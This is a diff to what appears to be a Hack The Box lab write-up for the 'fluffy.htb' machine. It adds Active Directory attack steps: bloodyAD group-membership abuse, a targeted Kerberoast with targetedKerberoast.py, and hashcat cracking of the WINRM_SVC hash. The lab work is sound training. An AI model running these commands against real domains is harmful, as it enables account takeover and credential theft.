@@ -173,7 +173,18 @@ Then, we find the shortest path from p.agila:
 
 So our first course of action is to add our `p.agila` user to the SERVICE ACCOUNTS group. We will do so using bloodyAD:
 
-``
+`bloodyAD --host dc01.fluffy.htb -d fluffy.htb -u p.agila -p $(cat creds/p.agila.pass) add groupMember 'SERVICE ACCOUNTS' p.agila`
 
 <img width="1069" height="84" alt="image" src="https://github.com/user-attachments/assets/c3ca46c5-15ce-418f-9031-2f76341b4048" />
+
+11. Next, we'll abuse our group membership to do a targeted Kerberoast attack on `WINRM_SVC`
+
+`targetedKerberoast.py -u p.agila -p $(cat creds/p.agila.pass) -d fluffy.htb`
+
+<img width="1070" height="924" alt="image" src="https://github.com/user-attachments/assets/c5eae65a-d401-4b7a-817e-b716b0967d6d" />
+
+12. We get back 3 service account hashes. However, since we already know the one we need is the `WINRM_SVC` account, we'll proceed to crack the hash for that one.
+
+`hashcat -m 13100 winrm_svc.kerberoast_hash /usr/share/wordlist/rockyou.txt`
+
 
